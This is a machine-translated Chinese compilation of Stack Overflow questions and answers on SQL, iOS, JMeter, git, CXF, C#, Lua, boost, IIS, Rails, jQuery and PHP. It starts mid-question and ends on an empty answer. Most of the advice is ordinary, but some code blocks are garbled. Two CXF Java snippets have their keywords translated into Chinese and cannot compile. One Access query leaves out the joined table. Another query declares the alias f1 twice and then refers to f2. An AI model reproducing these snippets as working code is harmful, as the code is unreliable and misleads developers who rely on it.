我想知道对于至少可以使该子查询与其他子查询保持一致的联合，我可能有哪些替代方案。做出改变可能有助于这种特殊情况，但对其他情况不利，反之亦然，这有点令人抓狂。我已经修补了一些东西，但没有运气。解释计划表明，至少正在使用正确的索引。我知道我没有太多示例，但是这些查询总体上非常庞大，很难简洁地发布必要的数据，但如果有必要，请告诉我，我会尝试将一些东西拼凑起来. 谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:02:07.920

您尝试以下两种替代 a `union`：

```
WHERE   TABLE.COLUMN IN (subquery1)
        OR TABLE.COLUMN IN (subquery2) 
```

或使用过滤连接：

```
SELECT  *
FROM    TABLE T
LEFT JOIN   
        (
        subquery1
        ) f1
ON      f1.COLUMN = T.COLUMN
LEFT JOIN   
        (
        subquery2
        ) f1
ON      f2.COLUMN = T.COLUMN
WHERE   f1.COLUMN IS NOT NULL
        OR f2.COLUMN IS NOT NULL 
```

# sql - SQL - 使用 Count 时为 0

> ID：15772115
> 
> 赞同：1
> 
> 时间：2013-04-02T18:55:18.650
> 
> 标签：sql, join, count

我有一个人的名单，他们的职业如下：

```
Doctor Male
Teacher  Male
Principal Male
Nurse Female
Doctor Male 
```

当我按专业对它们进行分组时，我希望 Access 为不在我拥有的子列表中的任何专业返回 0。这是我正在使用的代码：

```
SELECT Profession.Profession, Count(Profession.Profession) AS CountOfProfession
FROM People INNER JOIN Profession ON People.PeopleID = Profession.PeopleID
WHERE (((People.Sex)="Male"))
GROUP BY Profession.Profession; 
```

我希望它为医生产生 2，因为有 2 名男性，但也为护士产生 0，因为没有男性护士。请让我知道我该怎么做，谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T18:56:19.247

你需要一个外部连接。我切换了表格的顺序，所以它是`left join`：

```
SELECT Profession.Profession,
       sum(iif(people.sex = "Male", 1, 0)) AS CountOfProfession
FROM Profession LEFT JOIN
     ON People.PeopleID = Profession.PeopleID 
GROUP BY Profession.Profession; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:15:00.690

这可以通过外部连接并将条件从子句移动`WHERE`到`ON`子句来完成：

```
SELECT Profession.Profession, 
       COUNT(People.PeopleID) AS CountOfProfession
FROM Profession 
  LEFT JOIN People 
    ON (  People.PeopleID = Profession.PeopleID
      AND People.Sex = 'Male' )
GROUP BY Profession.Profession ; 
```

# ios - 延迟将图像存储到 iPhone

> ID：15772117
> 
> 赞同：0
> 
> 时间：2013-04-02T18:55:20.313
> 
> 标签：ios, objective-c

我正在开发一个 iOS 应用程序，如果应用程序没有互联网连接，它需要下载图像以在下次显示它。

我获得了从请求中将此图像下载到服务器的 URL，我得到了一个带有“图像”字段的 json，其中包含图像的 url。要下载和存储此图像，我执行以下操作：

```
NSData * data = [NSData dataWithContentsOfURL:[NSURL URLWithString:utfString]];
[data writeToFile:[NSString stringWithFormat:@"%@/%@",documentsDirectoryPath,@"superPremio"] atomically:NO]; 
```

这在成功的服务器调用块内调用。所以我不是同步进行的。此服务器调用是在`viewDidLoad`需要显示图像的视图控制器中进行的。这个视图控制器有一个 UIScrollView 并且当图像被写入内存时这个滚动视图正在试验一个滞后。一切都是在后台处理中完成的，所以我不确定为什么会这样……知道吗？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:00:20.047

数据获取过程

```
NSData * data = [NSData dataWithContentsOfURL:[NSURL URLWithString:utfString]]; 
```

不是异步的，它会导致 UI 滞后

使用此[答案](https://stackoverflow.com/a/9786513/1704346)使其异步

# ios - 使用 IOS 授权进行 NSFileProtectionComplete 加密

> ID：15772119
> 
> 赞同：1
> 
> 时间：2013-04-02T18:55:28.423
> 
> 标签：ios, security, encryption, entitlements

IOS：6.1 IDE：Appcelerator Titanium 3.0

当设备密码锁定时，我正在使用 IOS 权利将应用程序内容设置为加密。

我们有一个具有此权利设置的开发人员配置文件：com.apple.developer.default-data-protection NSFileProtectionComplete

我还将这个行/键集添加到我的应用程序的 Entitlements.plist 文件中。

这是一个基于 html 的应用程序，包括大量的 html 文本内容和图像，以及 sqlite 数据库的使用。当我设置上述并部署应用程序时，密码锁定设备，将其连接到未与 iTunes 同步的单独计算机，然后通过 iExplore 浏览设备，我可以验证我无法再访问数据库文件，由设备存储在“私人文档”中。但是，我仍然可以访问和保存我的 html 文件（包含所有文本内容）和图像/音频/等。从 iExplore 内部。这是在没有网络访问的情况下运行的敏感数据，因此安全地提供数据不是一种选择。

为什么它不加密其他资源？除了尝试创建 Titanium 模块以在应用程序内的每个单独资源上设置 NSFileProtectionKey 属性之外，还有其他方法吗（当我第一次尝试这个时它不起作用）？

# jmeter - httprequest 帖子正文中的变量

> ID：15772122
> 
> 赞同：24
> 
> 时间：2013-04-02T18:55:38.397
> 
> 标签：jmeter

我正在尝试生成一个 jmeter 脚本，其中每次运行脚本时都会创建一个唯一文件夹 - 将某种变量添加到文件夹名称中，例如用户名+时间戳，应该足以保证唯一性。但是，jmeter 没有将变量解析为其值 - 尽管这是从 csv 文件中读取变量时（这不合适）。

基本上，我是在http请求中编辑PostBody，如下：

```
 {"alf_destination":"workspace://SpacesStore/90368635-78a1-4dc5-be9e-33458f09c3f6","prop_cm_name":"Test
 Folder - ${variable}","prop_cm_title":"Test
 Folder","prop_cm_description":"Test Folder"} 
```

`variable`到目前为止，我尝试过的任何变量（例如随机字符串、时间戳等）基本上在哪里？

谁能建议如何解决变量？

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2013-09-05T11:51:01.583

您可以使用 jmeter（从 2.9 版本开始）uuid 功能 -> [http://jmeter.apache.org/usermanual/functions.html#__UUID](http://jmeter.apache.org/usermanual/functions.html#__UUID)

```
${__UUID} 
```

和

> 1）如果您只想要整个测试的 1 个值，请将“用户定义的变量”配置元素添加到您的测试中。这将在您第一次加载测试脚本时进行评估。
> 
> 2）如果您想更改每个线程执行的值，但在每个线程实例期间保持不变：在您的“线程组”下，将“预处理器 - >用户参数”添加到您的线程组 - 并添加变量那里。
> 
> 此外，如果您希望在每次线程重新启动时更改值（线程组中脚本的每次“迭代”），您可以选中用户参数上的“每次迭代更新一次”框 - 它会得到一个每次在测试脚本（在该线程组内）开始时重新启动线程时都会产生新值。

[http://mail-archives.apache.org/mod_mbox/jmeter-user/201208.mbox/%3C004301cd853e$0c4a60c0$24df2240$@gmail.com%3E](http://mail-archives.apache.org/mod_mbox/jmeter-user/201208.mbox/%3C004301cd853e$0c4a60c0$24df2240$@gmail.com%3E)

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2013-07-15T14:23:43.470

使用 JMeter 2.9，以下工作：

在 HTTP Request Sampler 中，选项卡“Post Body”添加例如您的 JSON 数据并在其中包含变量：

```
{"uuid":"${new-uuid}"} 
```

`new-uuid`是用户定义的变量。这将发送（从查看结果树，选项卡“请求”/“原始”）：

```
POST data:
{"uuid":"a1b2c3d4e5f6"} 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-04-03T09:53:15.657

我通过在 http 请求帖子正文中引用一个变量来做到这一点`${formvalues}`——使用附加到 http 请求采样器的 beanshell 预处理器创建。
豆壳内容：

```
double random = Math.random();    
String formvalues ="{\"alf_destination\":\"workspace://SpacesStore/90368635-78a1-4dc5-be9e-33458f09c3f6\",\"prop_cm_name\":\"Test Folder - ${uname}_" + random + "\",\"prop_cm_title\":\"Test Folder\",\"prop_cm_description\":\"Test Folder\"}";         
vars.put("formvalues",formvalues); 
```

因此，这将创建一个包含用户名 ( `${uname}`，取自 csv ) 加上一个随机数的文件夹 - 这很粗糙，因为可能仍然存在脚本尝试创建与现有文件夹同名的文件夹的情况，但它会起作用对于我的情况。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2020-04-23T10:23:52.833

假设您在 jmeter 变量“Location”中有值“NewYork”。

在 HTTP POST BODY DATA 中像这样使用它：

`{location:"${Location}"}`=> 这被解释为`{location:"NewYork"}`

# windows - Windows 的源代码树似乎不适用于有效的 SSH 密钥

> ID：15772125
> 
> 赞同：7
> 
> 时间：2013-04-02T18:55:46.680
> 
> 标签：windows, git, atlassian-sourcetree

我在 Windows 上的 Source Tree 中使用 putty 创建了一个 ssh 密钥对，然后将其添加到我的 repo 客户端（我在个人服务器上使用 Gitlab）。

这在 gitbash （克隆和推送等）和通过 OSX 的 SourceTree 可以正常工作，但是在将 .ppk 密钥添加到正在运行并且似乎已正确加载密钥的选美之后，我似乎无法通过 SourceTree 进行克隆。添加回购路径时，我收到“这不是有效的源路径/URL”，详细说明：

> 致命：无法从远程存储库中读取。请确保您具有正确的访问权限并且存储库存在。

如果我添加一个现有的存储库，我通过 git bash 使用相同的 ssh 密钥对克隆（只需将文件夹拖放到 Windows 的源树中），这似乎工作到一定程度 - 我可以提交并查看历史记录等。我尝试推送，但是，它失败了很多相同的消息（我已经改变了回购路径）：

> git -c diff.mnemonicprefix=false -c core.quotepath=false push -v --tags origin master:master 推送到 git@MyServer.com:MyRepo.git
> 
> 致命：无法从远程存储库中读取。请确保您具有正确的访问权限并且存储库存在。
> 
> 完成错误，见上文。

据我所知，Pageant 已在我的机器上使用正确的（仅适用于）ssh 密钥启动并运行。

非常欢迎任何帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-03T16:53:58.993

好的，所以这有点尴尬/令人困惑。

看来我没有将正确的公钥复制到我的回购管理 Web 界面上。问题是，我使用以下命令从 git bash 复制了公钥：

> 剪辑 < ~/.ssh/id_rsa.pub

但这似乎给了我一个与我在文本编辑器中实际打开 id_rsa.pub 不同的公钥......

这正常吗？为什么不一样？为什么它在 gitbash 中而不是在 SourceTree 中工作（通过选美）。

无论如何，当在记事本中打开文件时，直接从文件中复制我的公钥的内容就可以使用 SourceTree 和 Pageant 等。

# git - 我可以删除 git commit 但保留更改吗？

> ID：15772134
> 
> 赞同：1549
> 
> 时间：2013-04-02T18:56:15.100
> 
> 标签：git, undo, git-reset

在我的一个开发分支中，我对我的代码库进行了一些更改。在我能够完成我正在开发的功能之前，我必须将我当前的分支切换到 master 来演示一些功能。但是仅使用“git checkout master”就保留了我在开发分支中所做的更改，从而破坏了 master 中的一些功能。所以我所做的是在我的开发分支上提交更改，并使用提交消息“临时提交”，然后为演示签出 master。

现在我已经完成了演示并回到我的开发分支上工作，我想删除我所做的“临时提交”，同时仍然保留我所做的更改。那可能吗？

* * *

## 回答 #1

> 赞同：2378
> 
> 时间：2013-04-02T18:58:39.790

就这么简单：

```
git reset HEAD^ 
```

注意：某些 shell 将`^`其视为特殊字符（例如某些 Windows shell 或[启用了 globbing 的 ZSH](http://bewatermyfriend.org/p/2016/002/)），因此您可能必须在这些情况下引用`"HEAD^"`或使用。`HEAD~1`

`git reset`没有`--hard`或`--soft`移动你`HEAD`指向指定的提交，而不更改任何文件。`HEAD^`指您当前提交的（第一个）父提交，在您的情况下是临时提交之前的提交。

请注意，另一个选项是照常进行，然后在下一个提交点运行：

```
git commit --amend [-m … etc] 
```

它将改为*编辑*最近的提交，具有与上述相同的效果。

请注意，如果您已经将错误的提交推送到其他人可能已将其拉出的地方，这（与几乎所有 git 答案一样）可能会导致问题。尽量避免这种情况

* * *

## 回答 #2

> 赞同：268
> 
> 时间：2013-04-03T03:55:51.307

有两种处理方法。哪个更容易取决于您的情况

**重启**

如果您想要摆脱的提交是最后一次提交，并且您还没有完成任何额外的工作，您可以简单地使用`git-reset`

```
git reset HEAD^ 
```

将您的分支带回当前 HEAD 之前的提交。但是，它实际上并没有更改工作树中的文件。结果，该提交中的更改显示为已修改-就像“取消提交”命令。事实上，我有一个别名可以做到这一点。

```
git config --global alias.uncommit 'reset HEAD^' 
```

然后您可以`git uncommit`在将来使用它来备份一个提交。

**挤压**

压缩提交意味着将两个或多个提交合并为一个。我经常这样做。在您的情况下，您提交了一半完成的功能，然后您将完成它并使用正确的永久提交消息再次提交。

```
git rebase -i <ref> 
```

我在上面说是因为我想明确表示这可能是任意数量的提交。运行`git log`并找到您要删除的提交，复制其 SHA1 并使用它来代替`<ref>`. Git 将带您进入交互式变基模式。它将显示您当前状态和您放置的任何内容之间的所有提交`<ref>`。因此，如果`<ref>`是 10 次提交，它将显示所有 10 次提交。

在每次提交之前，都会有`pick`. 找到您要删除的提交并将其从 更改`pick`为`fixup`或`squash`。使用`fixup`简单地丢弃提交消息并将更改合并到列表中的直接前任中。关键字做同样的`squash`事情，但允许您编辑新组合提交的提交消息。

请注意，当您退出编辑器时，提交将按照它们在列表中显示的顺序重新提交。因此，如果您进行了临时提交，然后在同一分支上进行了其他工作，并在以后的提交中完成了该功能，那么使用 rebase 将允许您重新排序提交并压缩它们。

**警告：**

*变基会修改历史记录 - 不要对您已经与其他开发人员共享的任何提交执行此操作。*

**藏匿**

将来，为避免此问题，请考虑使用`git stash`临时存储未提交的工作。

```
git stash save 'some message' 
```

这会将您当前的更改存储在您的存储列表中。以上是最明确的 stash 命令版本，允许使用注释来描述您要存储的内容。您也可以简单地运行而不执行`git stash`其他任何操作，但不会存储任何消息。

您可以使用...浏览您的存储列表

```
git stash list 
```

这将向您显示您的所有存储，它们在哪些分支上完成，以及每行开头的消息和该存储的标识符，如下所示`stash@{#}`，其中 # 是它在存储数组中的位置。

要恢复存储（可以在任何分支上完成，无论最初创建存储的位置如何），您只需运行...

```
git stash apply stash@{#} 
```

同样，# 是存储数组中的位置。如果您要恢复的存储在该`0`位置 - 也就是说，如果它是最近的存储。然后你可以在不指定存储位置的情况下运行命令，git 会假设你的意思是最后一个：`git stash apply`.

因此，例如，如果我发现自己在错误的分支上工作 - 我可能会运行以下命令序列。

```
git stash
git checkout <correct_branch>
git stash apply 
```

在您的情况下，您在分支周围移动了一点，但同样的想法仍然适用。

希望这可以帮助。

* * *

## 回答 #3

> 赞同：188
> 
> 时间：2018-03-09T09:57:40.050

我想你正在寻找这个

`git reset --soft HEAD~1`

它撤消最近的提交，同时将该提交中所做的更改保持在暂存状态。

* * *

## 回答 #4

> 赞同：102
> 
> 时间：2016-08-23T18:44:41.983

是的，您可以在不删除更改的情况下删除您的提交：

```
git reset @~ 
```

* * *

## 回答 #5

> 赞同：58
> 
> 时间：2019-06-06T11:22:58.733

您正在寻找`git reset HEAD^ --soft`或`git reset HEAD^ --mixed`。

[如文档](https://git-scm.com/docs/git-reset/2.3.9#git-reset-emgitresetemltmodegtltcommitgt)中所述，重置命令有 3 种模式：

## **`git reset HEAD^ --soft`**

撤消`git commit`. 工作树（项目文件夹）+索引（--cached）中仍然存在更改

## **`git reset HEAD^ --mixed`**

撤消`git commit`+ `git add`。工作树中仍然存在更改

## **`git reset HEAD^ --hard`**

就像您从未对代码库进行过这些更改一样。更改已从工作树中消失。

* * *

## 回答 #6

> 赞同：20
> 
> 时间：2020-06-04T17:51:37.530

**2020 简单方法：**

```
git reset <commit_hash> 
```

（您要保留的最后一次提交的提交哈希）。

如果提交被推送，您可以执行以下操作：

```
git push -f 
```

您将在本地保留现在未提交的更改

* * *

## 回答 #7

> 赞同：12
> 
> 时间：2017-05-18T14:20:22.183

就我而言，我已经推送到了仓库。哎哟!

您可以通过执行以下操作恢复特定提交，同时将更改保留在本地文件中：

```
git revert -n <sha> 
```

通过这种方式，我能够保留我需要的更改并撤消已经推送的提交。

* * *

## 回答 #8

> 赞同：10
> 
> 时间：2018-08-18T19:02:16.103

对于那些使用 zsh 的人，您必须使用以下内容：

`git reset --soft HEAD\^`

在这里解释：[https ://github.com/robbyrussell/oh-my-zsh/issues/449](https://github.com/robbyrussell/oh-my-zsh/issues/449)

如果 URL 失效，重要的部分是：

> 转义命令中的 ^
> 
> 您也可以使用 HEAD~ 这样您就不必每次都逃避它。

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2017-11-22T10:03:54.093

使用 git 2.9（确切地说是 2.9.2.windows.1） `git reset HEAD^`提示更多；不确定这里的预期输入。请参考下面的截图

[![在此处输入图像描述](https://i.stack.imgur.com/BfNIt.png)](https://i.stack.imgur.com/BfNIt.png)

找到了其他解决方案`git reset HEAD~#numberOfCommits`，我们可以选择使用该解决方案通过保持更改不变来选择要重置的本地提交数量。因此，我们有机会丢弃所有本地提交以及有限数量的本地提交。

请参阅下面显示`git reset HEAD~1`的屏幕截图： [![在此处输入图像描述](https://i.stack.imgur.com/m27db.png)](https://i.stack.imgur.com/m27db.png)

[![在此处输入图像描述](https://i.stack.imgur.com/HvasB.png)](https://i.stack.imgur.com/HvasB.png)

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2013-04-02T19:59:54.253

另一种方法来做到这一点。

在临时提交的顶部添加提交，然后执行：

```
git rebase -i 
```

将两个提交合并为一个（命令将打开带有明确说明的文本文件，编辑它）。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2020-06-12T07:09:17.780

在某些情况下，我只想在第一次提交时撤消对特定文件的更改，以将它们添加到第二次提交并拥有更清晰的 git 日志。

在这种情况下，我要做的是：

```
git checkout HEAD~1 <path_to_file_to_put_in_different_commit>
git add -u
git commit --amend --no-edit
git checkout HEAD@{1} <path_to_file_to_put_in_different_commit>
git commit -m "This is the new commit" 
```

当然，即使在`rebase -i`提交拆分时带有编辑选项的中间，这也能很好地工作。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2022-03-03T11:15:54.370

首先，您可以使用以下命令查看日志 -

```
git reflog 
```

这显示了所有提交，然后找出您要撤消的提交以及与之关联的 Head 编号，然后输入以下命令

```
git reset HEAD@{#NumberOfCommitYouWantToUndo} 
```

例如`git reset HEAD@{3}`

git reset HEAD@{#} 显示重置后所有未暂存的更改

# sql - Oracle sql 表显示不正确，但表中的信息正确？？使用甲骨文 11g

> ID：15772136
> 
> 赞同：0
> 
> 时间：2013-04-02T18:56:19.357
> 
> 标签：sql, oracle, sqlplus

我已经在 SQL 中创建了表，但表的布局方式不正确，因为它们是行内的，如此屏幕截图所示：

IE：

```
name

-----------------------------------------------------------------------------------------------------------------------
city

---------------------------------------------------------------------------------------------
country

--------------------------------------------------

british airways

london

uk 
```

如您所见，字段显示在数据之前。我刚刚向您展示了它的外观，在 SQL 中，字段名称（即“名称”）之后的行是点状的。

我正在使用 insert into 语句手动插入这些数据，即将客户（carrier_id、姓名、城市、国家等）插入客户值（'Ba01'、'london'、'uk'）；我有一种感觉，它的字段大小几乎都是 varchar2 (100)？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:15:34.953

我假设这是一个关于命令行工具 SQL*Plus 如何显示您的数据的问题。您可以通过更改列的格式来控制它

```
SQL> column name format a20
SQL> column city format a20
SQL> column country format a10 
```

将使用 20 列显示`name`， 20 列显示`city`， 10 列显示`country`。当然，您可以根据您希望数据的呈现方式来调整它们。

如果您有数字数据，则可以使用格式掩码，例如

```
SQL> column column_name format 999.99 
```

这将在小数点前最多显示三位数字和后两位。如果实际数据包含更多小数数据，它将将该数字四舍五入到适当的小数位数。如果数字太大（在这种情况下，值大于或等于 1000），SQL*Plus 将无法显示数据，因此您会看到一堆替换字符 ( `#`)。

但是，大多数情况下，如果您只是想查看数据，最好使用更适合以令人愉悦的格式呈现数据的工具。例如，Oracle 的 SQL Developer 是一个免费的 PL/SQL IDE，它将以漂亮的表格网格呈现数据，而不是试图在基于文本的命令行工具中显示数据。

# web-services - 在 Apache CXF 中动态设置启用 MTOM 的属性

> ID：15772138
> 
> 赞同：2
> 
> 时间：2013-04-02T18:56:22.347
> 
> 标签：web-services, cxf

我正在使用 Apache CXF 框架开发 SOAP Web 服务。我的网络方法根据请求参数返回二进制数据或纯 XML。大多数请求都返回二进制数据，因此我将 CXF 配置为在服务响应中使用 MTOM。

但这并不总是有用的：当返回 XML 时，调用方期望得到纯文本/xml 文档而不是多部分文档。所以我希望我的网络服务能够动态地改变它的绑定。

CXF 文档有以下示例：

```
端点 ep = ...; // 例子没有说明如何获取
SOAPBinding 绑定 = (SOAPBinding)ep.getBinding();
binding.setMTOMEnabled(true); // 或假

```

问题：如何获取`Endpoint`实例？

我将 Spring 注释 @Endpoint 用于 Web 服务，将 @PayloadRoot 用于 Web 方法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-03T03:54:42.147

如果您使用 on ，您可以使用以下代码`server`，

你需要添加`import javax.xml.ws.Endpoint;`

```
HelloWorldImpl implementor = new HelloWorldImpl();
String address = "http://localhost:9000/helloWorld";
Endpoint.publish(address, implementor); 
```

从客户端

```
TestMtomService tms = new TestMtomService(wsdlURL, SERVICE_NAME);
TestMtomPortType port = (TestMtomPortType)tms.getPort(PORT_NAME,TestMtomPortType.class);
Binding binding = ((BindingProvider)port).getBinding();
((SOAPBinding)binding).setMTOMEnabled(true); 
```

参考

如果您下载了 cxf 包，`MTOM`服务器/客户端的代码示例可在以下路径中找到

apache-cxf-2.7.2\samples\mtom

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-05-22T20:24:40.330

我创建了自己的编组类，从`org.springframework.oxm.jaxb.Jaxb2Marshaller`. 仅覆盖单个方法：

```
公共类 Marshaller 扩展 Jaxb2Marshaller {
  @覆盖
  公共无效元帅（对象图，结果结果，MimeContainer mimeContainer）抛出 XmlMappingException {
    if ( disableMtom() ) {
      超级元帅（图，结果，空）；
    } 别的 {
      super.marshal（图形，结果，mimeContainer）；
    }
  }

  私人布尔disableMtom（）{
    return ... // 取决于响应上下文
  }
}

```

`disableMtom`检测是否从响应上下文中禁用了 MTOM 。Web 服务端点以某种方式将此上下文传递给编组器。

默认情况下启用 MTOM。

# c# - 在 c# 中将 Uint64 转换为 5 个字节，反之亦然

> ID：15772140
> 
> 赞同：0
> 
> 时间：2013-04-02T18:56:24.137
> 
> 标签：c#, type-conversion, byte, uint64

我有一个应用程序需要从一个数字派生的 5 个字节。现在我使用的是 4 个字节的 Uint32。我被告知要创建一个使用字节和 Uint32 的类。但是，我不确定如何组合它们，因为它们是数字。

我认为最好的方法可能是使用 Uint64 并将其转换为 5 个字节。但是，我不确定如何做到这一点。我需要能够将其转换为 5 个字节并在类中使用一个单独的函数将其转换回 Uint64。

有没有人对最好的方法有任何想法？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-02T19:00:14.053

使用[BitConverter.GetBytes](http://msdn.microsoft.com/en-us/library/d8z32tce.aspx)然后删除不需要的三个字节。

要将其转换回来，请使用[BitConverter.ToUInt64](http://msdn.microsoft.com/en-us/library/system.bitconverter.touint64.aspx)记住，您必须首先用三个额外（零）字节填充字节数组。

请注意字节顺序。如果您发送这些字节的应用程序期望相反的字节序，您可能需要反转您的数组。此外，字节序将决定您是否需要从数组的开头或结尾添加/删除字节。（检查[BitConverter.IsLittleEndian](http://msdn.microsoft.com/en-us/library/system.bitconverter.islittleendian.aspx)）

# variables - 如何在 lua_state 中实例化一个新的局部变量？

> ID：15772146
> 
> 赞同：-1
> 
> 时间：2013-04-02T18:56:45.123
> 
> 标签：variables, lua, instance, local

我需要在 *lua_state* 中实例化新变量，但这些变量必须是**local**。在那之前，我只知道用 *lua_setglobal* 设置全局变量。我知道*lua_setlocal*，但我不知道如何处理一个lua_Debug。

问题是，如何在 *lua_state* 中实例化一个新的**局部变量？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T23:16:05.527

局部变量实际上只是 Lua 堆栈上的一个位置（除非局部变量来自函数外范围），编译后的代码可以读取。一段 Lua 代码可用的本地集合*在 compile-time 是固定的*。所以影响它的唯一方法是编辑你的 Lua 脚本的实际*文本*以添加一个本地。并且两个 Lua 脚本不能共享本地。

简而言之，你想要的东西是不可能的，也没有意义。

# c++ - boost::algorithm::contains std::vector &长期价值

> ID：15772149
> 
> 赞同：0
> 
> 时间：2013-04-02T18:56:55.037
> 
> 标签：c++, boost, contains

我正在使用`boost::algorithm::contains(std::vector<long>, long value)`并收到许多错误。

```
std::vector<long> instance;
long byteIndex;
// (Perhaps more code?...)
boost::algorithm::contains(instances, byteIndex); 
```

我不明白这个编译器错误`C2039: 'type' : is not a member of 'boost::range_const_iterator<C>'`。

我阅读了模板类并看到了使用 std::string 的演示

```
std::string s = "Boris Schäling"; 
boost::algorithm::contains(s, "is"); 
```

除了我使用不同的类型外，我不认为我对 boost 的使用有任何不同。知道为什么`boost::algorithm::contains(std::vector<long>, long)`不编译吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:12:45.117

`boost::algorithm::contains`需要两个范围，输入范围和要搜索的范围。您收到错误是因为您提供了第一个范围 ( `std::vector<long>`) 而不是第二个范围 (您只提供了一个`long`值)。

你最好使用`std::find`：

```
std::find(vector.begin(), vector.end(), value) != vector.end() 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T19:17:53.210

`boost::algorithm::contains`需要两个范围。您正在向量中搜索一个值。

在您的字符串示例中，您正在搜索序列`"is"`。如果您要搜索`'i'`（不是一个序列，一个值），您会得到与您使用`vector<long>`.

编码：

```
std::vector<long> v { 1,2,3,4,5 };
std::vector<long> v1 { 3, 4 };
boost::algorithm::contains(v, v1); 
```

编译就好了。

# http - IIS8：100-继续和 401 与 HTTP PUT

> ID：15772152
> 
> 赞同：1
> 
> 时间：2013-04-02T18:57:11.370
> 
> 标签：http, iis, http-authentication, sharepoint-2013, iis-8

我有一个客户端发出 HTTP PUT 以将文件上传到 SharePoint 服务器。此服务器需要身份验证（NTLM 或协商）。客户端在 PUT 请求中包含一个“Expect: 100-Continue”标头。

当我将文件放入 SharePoint2010 (IIS 7.5) 时，服务器在收到标头后立即响应 401 错误。这允许客户端开始验证过程而无需上传整个文件。

当我将文件放入 SharePoint2013 (IIS 8.0) 时，服务器立即响应 100-继续。但是，一旦客户端在请求正文中上传了文件，它就会回复 401。这意味着客户端上传了整个文件只是为了收到身份验证错误。在客户端上传所有数据之前，服务器应该能够响应 401，就像 IIS 7.5 一样。

这种行为变化是 IIS8 固有的吗？有没有控制这个的配置选项？我可以在标头中调整一些东西来改变服务器的行为吗？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-07-16T14:17:04.150

您必须从 HTTP 标头中删除 expect: 100-Continue 如果您使用 .NET，此链接将很有用： [删除期望 http 标头](http://weblogs.asp.net/erwingriekspoor/archive/2010/09/26/removing-the-expect-http-header.aspx)

# ruby-on-rails - Rails - 默认日期时间格式的模型方法

> ID：15772154
> 
> 赞同：0
> 
> 时间：2013-04-02T18:57:16.580
> 
> 标签：ruby-on-rails, ruby-on-rails-3

在数据库中，一切都是 DateTime 格式。但是，在我的 Post 模型中，我想指定一个默认的日期和时间格式，当记录为 GET 时输出该格式。由于这是一个 API，我想我会使用 Twitter 的格式，除非有人有更好的建议：

```
"created_at":"Thu, 06 Oct 2011 19:41:12 +0000" 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:34:44.903

您可以尝试覆盖模型上的 as_json 方法：

```
def as_json(options)
  super(:methods => [:formatted_date])
end 
```

然后有一种方法可以按照您想要的方式格式化日期

```
def formatted_date
  # format date string here
end 
```

这是假设您的控制器正在呈现 json 之类的`format.json { render :json => @object }`.

我建议使用构建器来序列化数据（[jbuilder](https://github.com/rails/jbuilder)或[active_model_serializers](https://github.com/rails-api/active_model_serializers)）

# jquery - 如何将json文件调用到html中

> ID：15772166
> 
> 赞同：-1
> 
> 时间：2013-04-02T18:58:13.730
> 
> 标签：jquery, json

我有 json 文件，我想从 json 文件中调用图像和标题。要求是当我单击图像 1 时，第一个图像和标题应附加在 div 1 上，当我单击其他链接时，它应附加适当的图像。我的 json 文件包含

```
[
    {
        "image" : "images/test1.png",
        "heading" : "Careers"
    },
    {
        "image" : "images/item-2.png",
        "heading" : "Contact Us"
    },
    {
        "image" : "images/item-3.png",
        "heading" : "About Us"
    }
] 
```

我的代码

```
$(document).ready(function() {
    $("a").click(function() {
        var txt= $(this).text()
        $.getJSON("myson.js",function(result) {
            $.each(result, function(i, field) {
                if(txt.indexOf('1')>-1) {

                }

                else if(txt.indexOf('2')>-1) {

                }
                else {

                }

            });
        });
    });
}); 
```

html

```
<a href='#'>Image 1</a>
<a href='#'>Image 2</a>
<a href='#'>Image 3</a>

<div style="border:solid 1px #000; width:200px; height:200px">
    <div id='heading'></div>
    <div id='image'></div>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:25:56.757

首先，您不希望每次单击图像时都加载 JSON 文件。您希望在开始时加载一次 JSON 文件并将信息存储为变量对象。

然后，当您单击图像时，您只需从变量对象中获取信息并将信息放入“标题”和“图像”div。

此外，您应该为您的标签提供某种值属性（例如**id**或只是组成一个类似**value**），以便在您决定将来要切换某些东西并且不必重新编写 /重新排序您的 json 文件。

为了下面的代码，将您的 3 个标签更改为如下所示：

```
<a val='0' href='#'>Image 1</a>
<a val='1' href='#'>Image 2</a>
<a val='2' href='#'>Image 3</a> 
```

JS：

```
$().ready(
    function(){
        var dataSet;
        $.getJSON("myson.js",function(d){}).success(processData);

        function processData(ds){
            dataSet = ds;
        }

        $("a").click(function(){
            $("#heading").empty().html(dataSet[Number($(this).attr('val'))].heading);
            $("#image").empty().html("<img src='" + dataSet[Number($(this).attr('val'))].image + "' />");
        }
    }
); 
```

试试看

# php - 使用 PHP 在网站上显示来自外部 XML 提要的数据

> ID：15772170
> 
> 赞同：0
> 
> 时间：2013-04-02T18:58:30.700
> 
> 标签：php, xml, wordpress, xml-parsing

我需要在我的网站上显示来自外部 XML 提要的数据，但我完全不知道从哪里开始。获取 XML 提要并将以下元素打印到我的页面中的完整 PHP 代码是什么：

```
<name></name>
<status></status>
<pin></pin>
<picture>
</picture>
<description></description>
<category name="skills">
  <skill></skill>
</category>
<category name="tools">
  <tool></tool>
  <tool></tool>
  <tool></tool>
</category>
<category name="subjects">
  <subject></subject>
</category> 
```

* * *

## 回答 #1

> 赞同：1
> 
